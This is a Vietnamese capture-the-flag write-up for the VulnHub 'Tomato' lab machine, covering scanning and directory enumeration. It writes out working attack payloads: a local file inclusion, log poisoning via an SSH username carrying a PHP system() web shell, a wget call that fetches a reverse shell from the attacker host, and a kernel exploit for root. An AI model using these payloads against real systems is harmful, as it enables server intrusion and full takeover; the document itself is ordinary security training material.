![](https://images.viblo.asia/b0b4dc4f-d142-4771-8aec-b75f5bf9cbd4.jpg)

**Giới thiệu**

Tomato là 1 machine về leo quyền trên Linux được thiết kế bởi [SunCSR team](https://research.sun-asterisk.com/cyber-security), thông tin về machine các bạn có thể xem tại [đây](http://vulnhub.com/entry/tomato-1,557/).


**Cài đặt machine**

Để chạy Tomato thì chúng ta nên cài đặt VMware Workstation Pro 15, machine đã được kiểm tra trên phiên bản này rồi nên chúng ta có thể cài đặt mà không lo bị lỗi.

Việc cài đặt rất đơn giản: chỉ cần tải file Tomato.zip về, giải nén ra, sau đó trong VMware chọn **file** > **open** > chọn** **file ovf/ova**** > chọn "**I copied it**" là được. 

Sau khi cài đặt VM rồi, chúng ta cần kiểm tra lại thông tin VM xem Network Adapter đã ở chế độ **NAT** chưa. 
Nếu đang ở chế độ Bridge thì chúng ta cần chuyển sang chế độ NAT, chỉ cần chọn **Edit virtual machine settings** > tại mục **Network Adapter** chọn **NAT** > **save**.

![](https://images.viblo.asia/e879ce4f-7d2d-4894-bc96-c5e254b5ba66.jpg)


**Network Scanning**

Đầu tiên để tìm kiếm địa chỉ IP của máy mục tiêu, ta tiến hành kiểm tra ip của máy với lệnh `ifconfig`

![](https://images.viblo.asia/1449a6c5-5341-43c7-887a-0c097c367bdc.jpg)


Với IP là 192.168.1.4 chúng ta sử dụng nmap quét toàn bộ ip trong dải này để tìm kiếm ip của  Tomato `
nmap 192.168.1.0/24
`

![](https://images.viblo.asia/02456565-61ad-4fff-875a-ed2c76b36208.jpg)

![](https://images.viblo.asia/9367c717-39f8-44ad-b0e9-d5d8a6032cdd.jpg)

Scan với nmap :
`nmap -sV -sS -p- 192.168.1.3`

* **-sS**: scan bằng giao tức TCP SYN
* **-sV**: scan tìm phiên bản của các dịch vụ chạy trên cổng
* **-p-**: scan with full port (65535 port)

![](https://images.viblo.asia/731078ab-222c-4410-9f90-52d7830c699d.jpg)


**Enumeration**

Bắt đầu với port 80 , sử dụng dirb để liệt kê thư mục 

```
dirb http://192.168.1.3 -f
```

![](https://images.viblo.asia/f4c2f540-73b7-40e2-9877-46337886c31c.jpg)

Truy cập theo đường dẫn dirb trả về:

![](https://images.viblo.asia/bd054adc-4baa-416e-9827-0f7d27f8d061.jpg)

![](https://images.viblo.asia/f8032607-372a-4f7a-85af-5c608bc8d35a.jpg)


Tiến hành view-source ta nhận được nội dung:

![](https://images.viblo.asia/2199afb1-a865-4a7d-b95f-6e269780e57f.jpg)

`</?php include $_GET['image'];  ?>` gợi ý cho chúng ta về  lỗ hổng Local File Inclusion (LFI)

**Khai thác Local File Inclusion (LFI)**

Với những gì tác giả đã để lại, chúng ta tiến hành kiểm thử với payload sau:

http://192.168.1.3/antibot_image/antibots/info.php?image=/etc/passwd

![](https://images.viblo.asia/951a32e5-edd1-41c7-bf43-998397f8506b.jpg)


**From LFI to RCE**

Với LFI trong tay, mình lần lượt tìm đọc nội dung các file quan trọng  và phát hiện auth.log có thể đọc được thông qua lỗ hổng này 

Payload http://192.168.1.3/antibot_image/antibots/info.php?image=/var/log/auth.log

![](https://images.viblo.asia/9a2d23b8-36ff-4ea2-adae-503f1dce1a85.jpg)

> "auth.log" là file lưu trữ nhật ký truy cập hệ thống. Khi chúng ta đăng nhập thông qua giao diện chính hay qua SSH thì các thông tin đều được lưu trữ tại đây kể cả thành công hay thất bại . Ví dụ như khi chúng ta đăng nhập vào Server thông qua SSH với nội dung `ssh abcd@192.168.1.3 ` và nhập mật khẩu sai nhiều lần, thì nội dung auth.log sẽ ghi nhận :
> 
> `user unknown Oct 18 08:59:17 ubuntu sshd[916]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.1.10 Oct 18 08:59:20 ubuntu sshd[916]: Failed password for invalid user abcd from 192.168.1.10 port 54254 ssh2`

Như vậy phương pháp của chúng ta đơn giản chỉ cần thay user **abcd** kia thành payload tùy ý, từ đó hoàn toàn có thể kiểm soát server. 

Payload: 
```
ssh '<?php system($_GET["cmd"]);?>'@192.168.1.3 -p 2211
#
http://192.168.1.3/antibot_image/antibots/info.php?image=/var/log/auth.log&cmd=id
```

![](https://images.viblo.asia/9985802b-ce19-463e-b33a-8fa7678f40b7.jpg)

Tiến hành thực hiện [revershell-shel](https://viblo.asia/p/hieu-ro-ve-reverse-shells-LzD5ddE45jY)l theo cách sau : 

Bước 1: Download php-reverse-shell tại [đây](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) 

Bước 2: Chỉnh sửa nội dung [host/port] 

Bước 3: Sử dụng SimpleHTTPServer để build một web-server đơn giản trên máy attacker

```
python3 -m http.server 8081
```

Bước 4: Download shell về Tomato 

```
Payload: http://192.168.1.3/antibot_image/antibots/info.php?image=/var/log/auth.log&cmd=wget%20192.168.1.4:8081/php-reverse-shell.php%20-O%20/tmp/shell.php
```

Bước 5: Thực thi shell 

http://192.168.1.3/antibot_image/antibots/info.php?image=/tmp/shell.php


![](https://images.viblo.asia/ee46d176-14b2-47fe-88e6-4de99c03fcad.jpg)

**Privilege Escalation**

 Kểm tra phiên bản Kernel bằng cách sử dụng lệnh:
 ```
 uname -a
 ````
 
 ![](https://images.viblo.asia/33b1e366-c421-42c0-bfa8-1fa7ccce401b.jpg)

Phiên bản Kernel tồn tại lỗ hổng cho phép leo thang đặc quyền . 

Thực hiện download [mã khai thác ](https://www.exploit-db.com/raw/45010)và biên dịch với GCC trên máy Attacker

```
wget https://www.exploit-db.com/raw/45010 -O exploit.c
gcc exploit.c -o exploit
chmod +x exploit
```


Chuyển mã khai thác sang Tomato và thực thi 

![](https://images.viblo.asia/6edfa355-af97-4b62-9822-617b81610750.jpg)

ROOTED!!!